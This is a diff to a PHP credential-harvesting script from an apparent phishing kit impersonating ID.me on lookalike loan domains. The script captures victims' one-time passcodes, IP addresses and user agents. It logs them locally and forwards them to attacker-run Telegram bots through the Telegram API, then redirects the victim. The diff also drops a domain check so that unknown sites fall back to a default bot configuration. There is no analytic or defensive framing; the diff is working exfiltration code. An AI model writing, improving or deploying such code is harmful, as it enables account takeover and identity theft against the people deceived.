@@ -1,6 +1,7 @@
 <?php
 ob_start();
 
+// Site-specific configuration with domain-based bots and redirects
 $site_map = [
     'upstartloan.rf.gd' => [
         'bots' => [
@@ -43,44 +44,37 @@ $site_map = [
     ],
 ];
 
-$log_file = __DIR__ . '/otp_confirm_log.txt';
+// Get the referring domain
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
 
-function logToFile($data, $file) {
-    $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
-    file_put_contents($file, $entry, FILE_APPEND);
+// Find the configuration for this domain
+$config = $site_map[$domain] ?? null;
+
+// If no config found, use a default one
+if (!$config) {
+    $config = reset($site_map);
 }
 
-function sendToBots($message, $bots) {
-    foreach ($bots as $bot) {
-        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
-        
-        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
-        $data = [
-            'chat_id' => $bot['chat_id'],
-            'text' => $message,
-            'parse_mode' => 'Markdown'
-        ];
-        
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => $url,
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $data,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 30
-        ]);
-        curl_exec($ch);
-        curl_close($ch);
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Setup log file
+    $log_file = __DIR__ . "/logs/idme_otp_confirms.txt";
+    if (!file_exists(dirname($log_file))) {
+        mkdir(dirname($log_file), 0777, true);
     }
-}
 
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $referer = $_SERVER['HTTP_REFERER'] ?? '';
-    $parsed = parse_url($referer);
-    $domain = $parsed['host'] ?? 'unknown-origin';
-    
-    $otp_confirm = htmlspecialchars($_POST['otpconfirm'] ?? '???');
-    
+    // Logging function
+    function log_entry($msg) {
+        global $log_file;
+        $timestamp = date("Y-m-d H:i:s");
+        file_put_contents($log_file, "[$timestamp] $msg\n", FILE_APPEND);
+    }
+
+    // Get form data from HTML form - field name is 'otpconfirm'
+    $otpconfirm = htmlspecialchars($_POST['otpconfirm'] ?? '???');
+
+    // Get IP address SERVER-SIDE
     $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
           $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
           $_SERVER['HTTP_X_FORWARDED'] ?? 
@@ -89,34 +83,69 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
           $_SERVER['REMOTE_ADDR'] ?? 
           'unknown';
     
+    // Handle multiple IPs in X_FORWARDED_FOR
     if (strpos($ip, ',') !== false) {
         $ips = explode(',', $ip);
         $ip = trim($ips[0]);
     }
-    
+
     $timestamp = date("Y-m-d H:i:s");
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     
+    // Prepare Telegram message
     $message = "✅ *ID.me OTP Confirmation*\n\n" .
-               "🔒 *Confirm OTP Code:* `$otp_confirm`\n" .
+               "🔒 *Confirm OTP Code:* `$otpconfirm`\n" .
                "🌐 *Domain:* $domain\n" .
                "📡 *IP:* `$ip`\n" .
                "🕒 *Time:* $timestamp\n" .
                "🔍 *User Agent:* " . substr($user_agent, 0, 100);
-    
-    logToFile("[$domain] OTP Confirm: $otp_confirm | IP: $ip | UA: $user_agent", $log_file);
-    
-    if (isset($site_map[$domain])) {
-        $config = $site_map[$domain];
-        sendToBots($message, $config['bots']);
+
+    // Send to Telegram bots (using domain-specific bots from config)
+    foreach ($config['bots'] as $bot_index => $bot) {
+        if (empty($bot['token']) || empty($bot['chat_id'])) {
+            log_entry("Skipping bot $bot_index - empty token or chat_id");
+            continue;
+        }
         
-        ob_end_clean();
-        header("Location: " . $config['redirect']);
-        exit;
-    } else {
-        logToFile("❌ Unauthorized domain: $domain", $log_file);
-        http_response_code(403);
-        exit("Unauthorized domain");
+        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+        $data = [
+            'chat_id' => $bot['chat_id'],
+            'text' => $message,
+            'parse_mode' => 'Markdown'
+        ];
+
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => true
+        ]);
+        
+        $result = curl_exec($ch);
+        
+        if (curl_error($ch)) {
+            log_entry("❌ Telegram error (bot $bot_index): " . curl_error($ch));
+        } else {
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            log_entry("✓ Telegram sent (bot $bot_index) - HTTP $http_code");
+        }
+        
+        curl_close($ch);
     }
+
+    // Log the submission
+    log_entry("[$domain] OTP Confirm from $ip - Code: $otpconfirm");
+
+    // Clear output buffer and redirect to domain-specific URL
+    ob_end_clean();
+    header("Location: " . $config['redirect']);
+    exit;
+    
+} else {
+    // Not a POST request
+    echo "This page only accepts POST submissions from the OTP confirmation form.";
+    exit;
 }
 ?>
